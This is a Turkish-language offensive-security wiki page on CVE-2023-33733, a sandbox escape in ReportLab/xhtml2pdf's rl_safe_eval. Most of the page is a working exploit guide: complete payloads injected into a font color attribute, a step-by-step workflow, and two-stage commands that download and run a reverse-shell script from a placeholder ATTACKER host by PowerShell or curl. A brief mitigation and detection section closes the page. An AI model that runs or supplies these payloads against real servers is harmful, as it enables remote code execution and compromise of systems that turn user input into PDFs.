# ReportLab/xhtml2pdf [[[...]]] expression-evaluation RCE (CVE-2023-33733)

{{#include ../../../banners/hacktricks-training.md}}

Bu sayfa, ReportLab’in xhtml2pdf ve diğer PDF oluşturma boru hatlarında kullanıcı kontrollü HTML’i PDF’e renderlarken kullanılan rl_safe_eval içinde pratik bir sandbox kaçışı ve RCE ilkelini belgelendirir.

CVE-2023-33733, ReportLab sürümlerini 3.6.12 dahil olmak üzere etkiler. Belirli öznitelik bağlamlarında (örneğin color) triple brackets [[[ ... ]]] ile sarılmış değerler rl_safe_eval tarafından sunucu tarafında değerlendirilir. Bir payload ile beyaz listede olan bir builtin (pow) üzerinden Python fonksiyonunun globals’ına pivot yapılarak, saldırgan os modülüne ulaşabilir ve komut çalıştırabilir.

Temel noktalar
- Tetikleme: ReportLab/xhtml2pdf tarafından parse edilen işaretlemede <font color="..."> gibi değerlendirilen özniteliklere [[[ ... ]]] enjekte edin.
- Sandbox: rl_safe_eval tehlikeli builtinsleri değiştirir ancak değerlendirilen fonksiyonlar hâlâ __globals__’ı açığa çıkarır.
- Bypass: rl_safe_eval isim kontrollerini atlatmak ve bloke edilmiş dunder filtresinden kaçınarak "__globals__" stringine erişmek için geçici bir Word sınıfı oluşturun.
- RCE: getattr(pow, Word("__globals__"))["os"].system("<cmd>")
- Stabilite: Çalıştırmadan sonra özniteliğe geçerli bir değer döndürün (color için 'red' kullanın).

Ne zaman test edilmeli
- HTML-to-PDF ihracı (profil, fatura, raporlar) sunan ve PDF meta verilerinde veya HTTP yanıt yorumlarında xhtml2pdf/ReportLab gösteren uygulamalar.
- exiftool profile.pdf | egrep 'Producer|Title|Creator' → "xhtml2pdf" producer
- PDF için HTTP yanıtı genellikle bir ReportLab generator yorumu ile başlar

Sandbox bypass nasıl çalışır
- rl_safe_eval birçok builtin’i kaldırır veya değiştirir (getattr, type, pow, ...) ve __ ile başlayan veya bir denylist’te olan isimleri reddetmek için isim filtresi uygular.
- Ancak, güvenli fonksiyonlar func.__globals__ olarak erişilebilen bir globals sözlüğünde yaşar.
- Gerçek builtin type fonksiyonunu kurtarmak için type(type(1)) kullanın (ReportLab’ın sarmalayıcısını atlayarak), sonra karşılaştırma davranışı değiştirilmiş bir str türevi Word sınıfı tanımlayın, böylece:
  - .startswith('__') → her zaman False döner (startswith('__') kontrolünü atlatır)
  - .__eq__ ilk karşılaştırmada False döner (denylist üyelik kontrollerini atlatır) ve sonrasında True döner (böylece Python getattr çalışır)
  - .__hash__ hash(str(self)) ile eşittir
- Bununla, getattr(pow, Word('__globals__')) sarmalanmış pow fonksiyonunun globals sözlüğünü döndürür; bu sözlük içe aktarılmış bir os modülünü içerir. Ardından: ['os'].system('<cmd>').

Minimal sömürü deseni (öznitelik örneği)
Payload’u değerlendirilen bir özniteliğin içine yerleştirin ve boolean ve 'red' ile özniteliğe geçerli bir değer döndüğünden emin olun.

<para><font color="[[[getattr(pow, Word('__globals__'))['os'].system('ping 10.10.10.10') for Word in [ orgTypeFun( 'Word', (str,), { 'mutated': 1, 'startswith': lambda self, x: 1 == 0, '__eq__': lambda self, x: self.mutate() and self.mutated < 0 and str(self) == x, 'mutate': lambda self: { setattr(self, 'mutated', self.mutated - 1) }, '__hash__': lambda self: hash(str(self)), }, ) ] ] for orgTypeFun in [type(type(1))] for none in [[].append(1)]]] and 'red'">
exploit
</font></para>

- Liste-anlama formu rl_safe_eval için kabul edilebilir tek ifadeye izin verir.
- Sonundaki and 'red' bir geçerli CSS rengi döndürür böylece render bozulmaz.
- Komutu gerektiği gibi değiştirin; tcpdump ile çalıştırmayı doğrulamak için ping kullanın.

Operasyonel iş akışı
1) PDF üreteciyi tespit edin
- PDF Producer xhtml2pdf gösterir; HTTP yanıtı ReportLab yorumunu içerir.
2) PDF’e yansıtılan bir girdi bulun (ör. profil bio/açıklama) ve bir ihracı tetikleyin.
3) Düşük gürültülü ICMP ile yürütmeyi doğrulayın
- Çalıştırın: sudo tcpdump -ni <iface> icmp
- Payload: ... system('ping <your_ip>') ...
- Windows genellikle varsayılan olarak tam olarak dört echo isteği gönderir.
4) Bir shell kurun
- Windows için, alıntılama/kodlama sorunlarını önlemek üzere güvenilir bir iki aşamalı yaklaşım:
- Aşama 1 (indirme):

<para><font color="[[[getattr(pow, Word('__globals__'))['os'].system('powershell -c iwr http://ATTACKER/rev.ps1 -o rev.ps1') for Word in [ orgTypeFun( 'Word', (str,), { 'mutated': 1, 'startswith': lambda self, x: 1 == 0, '__eq__': lambda self, x: self.mutate() and self.mutated < 0 and str(self) == x, 'mutate': lambda self: { setattr(self, 'mutated', self.mutated - 1) }, '__hash__': lambda self: hash(str(self)), }, ) ] ] for orgTypeFun in [type(type(1))] for none in [[].append(1)]]] and 'red'">exploit</font></para>

- Aşama 2 (çalıştırma):

<para><font color="[[[getattr(pow, Word('__globals__'))['os'].system('powershell ./rev.ps1') for Word in [ orgTypeFun( 'Word', (str,), { 'mutated': 1, 'startswith': lambda self, x: 1 == 0, '__eq__': lambda self, x: self.mutate() and self.mutated < 0 and str(self) == x, 'mutate': lambda self: { setattr(self, 'mutated', self.mutated - 1) }, '__hash__': lambda self: hash(str(self)), }, ) ] ] for orgTypeFun in [type(type(1))] for none in [[].append(1)]]] and 'red'">exploit</font></para>

- Linux hedefler için curl/wget ile benzer iki aşamalı bir yöntem mümkündür:
- system('curl http://ATTACKER/s.sh -o /tmp/s; sh /tmp/s')

Notlar ve ipuçları
- Öznitelik bağlamları: color bilinen değerlendirilen bir özniteliktir; ReportLab işaretlemesindeki diğer öznitelikler de ifadeleri değerlendirebilir. Bir yer temizlenmişse, PDF akışına render edilen diğer yerlere (farklı alanlar, tablo stilleri, vb.) bakın.
- Alıntılama: Komutları kompakt tutun. İki aşamalı indirmeler alıntılama ve kaçış baş ağrılarını önemli ölçüde azaltır.
- Güvenilirlik: Eğer ihracatlar önbelleklenecek veya sıraya alınacaksa, önbelleğe çarpmamak için payload’u hafifçe değiştirin (ör. rastgele yol veya sorgu).

Önlemler ve tespit
- ReportLab’i 3.6.13 veya daha yeni sürüme güncelleyin (CVE-2023-33733 düzeltildi). Dağıtım paketlerindeki güvenlik duyurularını da takip edin.
- Kullanıcı kontrollü HTML/işaretlemeyi xhtml2pdf/ReportLab’e doğrudan vermeyin; katı sanitizasyon uygulayın. Güvenilmez giriş geldiğinde [[[...]]] değerlendirme yapıları ve vendor-spesifik etiketleri kaldırın/engelleyin.
- Untrusted girdiler için rl_safe_eval kullanımını tamamen devre dışı bırakmayı veya sarmalamayı düşünün.
- PDF oluşturma sırasında şüpheli giden bağlantıları izleyin (ör. belge ihracı yapılırken uygulama sunucularından giden ICMP/HTTP).

Referanslar
- PoC ve teknik analiz: [c53elyas/CVE-2023-33733](https://github.com/c53elyas/CVE-2023-33733)
- 0xdf University HTB write-up (gerçek dünya sömürüsü, Windows iki aşamalı payloadlar): [HTB: University](https://0xdf.gitlab.io/2025/08/09/htb-university.html)
- NVD girdisi (etkilenen sürümler): [CVE-2023-33733](https://nvd.nist.gov/vuln/detail/cve-2023-33733)
- xhtml2pdf docs (işaretleme/sayfa kavramları): [xhtml2pdf docs](https://xhtml2pdf.readthedocs.io/en/latest/format_html.html)

{{#include ../../../banners/hacktricks-training.md}}
